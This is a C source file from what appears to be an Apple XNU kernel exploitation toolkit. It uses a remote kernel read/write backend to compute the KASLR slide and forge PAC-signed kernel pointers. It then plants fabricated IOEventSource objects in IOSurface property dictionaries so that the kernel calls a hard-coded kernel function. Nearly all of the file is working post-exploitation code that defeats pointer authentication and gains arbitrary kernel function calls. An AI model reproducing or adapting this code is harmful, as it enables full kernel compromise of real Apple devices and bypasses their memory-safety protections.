//
//  main.c
//  xe
//
//  Created by admin on 11/20/21.
//

#include <assert.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <limits.h>

#include "kmem.h"
#include "kmem_remote.h"
#include "slider.h"
#include "platform_params.h"
#include "platform_params.h"
#include "platform_params.h"
#include "allocator_iosurface.h"
#include "xnu_proc.h"
#include "util_pacda.h"
#include "util_kalloc_heap.h"
#include "io_dictionary.h"
#include "io_array.h"
#include "io_registry_entry.h"
#include "io_surface.h"
#include "util_zalloc.h"
#include "util_kfunc_basic.h"
#include "util_ptrauth.h"
#include "util_assert.h"


int test_pacda(int argc, const char* argv[]) {
    xe_assert_cond(argc, ==, 2);
    
    struct xe_kmem_backend* backend = xe_kmem_remote_client_create(argv[1]);
    xe_kmem_use_backend(backend);
    xe_slider_init(xe_kmem_remote_client_get_mh_execute_header(backend));
    
    uintptr_t proc = xe_xnu_proc_current_proc();
    printf("[INFO] pid: %d\n", getpid());
    printf("[INFO] proc: %p\n", (void*)proc);
    
    for (int i=0; i<10; i++) {
        uintptr_t ptr = proc;
        uintptr_t ctx = 0xabcdef;
        uintptr_t signed_ptr;
        
        int error = xe_util_pacda_sign(proc, ptr, ctx, &signed_ptr);
        if (error) {
            printf("[ERROR] ptr sign failed, err: %d\n", error);
            return 1;
        }
        
        printf("[INFO] signed ptr: %p\n", (void*)signed_ptr);
    }
    return 0;
}

int main(int argc, const char* argv[]) {
    struct xe_kmem_backend* backend = xe_kmem_remote_client_create(argv[1]);
    xe_kmem_use_backend(backend);
    xe_slider_init(xe_kmem_remote_client_get_mh_execute_header(backend));
    
    uintptr_t record_function = xe_slider_slide(0xfffffe0007aaba58);
    
    uintptr_t proc = xe_xnu_proc_current_proc();
    
    xe_util_zalloc_t io_event_source_allocator = xe_util_zalloc_create(xe_kmem_read_uint64(xe_slider_slide(VAR_ZONE_IO_EVENT_SOURCE)), 1);
    xe_util_zalloc_t block_allocator = xe_util_zalloc_create(xe_util_kh_find_zone_for_size(xe_slider_slide(VAR_KHEAP_DEFAULT_ADDR), 128), 1);
    
    xe_util_kfunc_basic_t util1 = xe_util_kfunc_basic_create(proc, io_event_source_allocator, block_allocator, VAR_ZONE_ARRAY_LEN - 1);
    xe_util_kfunc_basic_t util2 = xe_util_kfunc_basic_create(proc, io_event_source_allocator, block_allocator, VAR_ZONE_ARRAY_LEN - 2);
    
    for (int i=0; i<10; i++) {
        uintptr_t io_event_source1 = xe_util_kfunc_build_event_source(util1, record_function);
        uintptr_t io_event_source2 = xe_util_kfunc_build_event_source(util2, record_function);
        
        iokit_iosurface_allocator_t allocator;
        int error = iokit_iosurface_allocator_create(&allocator);
        xe_assert_err(error);
        
        size_t alloc_idx;
        error = iokit_iosurface_allocator_allocate(allocator, 64, 1, &alloc_idx);
        xe_assert_err(error);
        error = iokit_iosurface_allocator_allocate(allocator, 64, 1, &alloc_idx);
        xe_assert_err(error);
        
        uintptr_t surface;
        error = xe_io_surface_scan_all_clients_for_prop("iosurface_alloc_1", &surface);
        xe_assert_err(error);
        
        uintptr_t props = xe_kmem_read_uint64(KMEM_OFFSET(surface, TYPE_IOSURFACE_MEM_PROPS_OFFSET));
        error = xe_io_os_dictionary_set_value_of_key(props, "iosurface_alloc_0", io_event_source1);
        xe_assert_err(error);
        error = xe_io_os_dictionary_set_value_of_key(props, "iosurface_alloc_1", io_event_source2);
        xe_assert_err(error);
        
        iokit_iosurface_allocator_destroy(&allocator);
        xe_util_kfunc_reset(util1);
        xe_util_kfunc_reset(util2);
    }
}
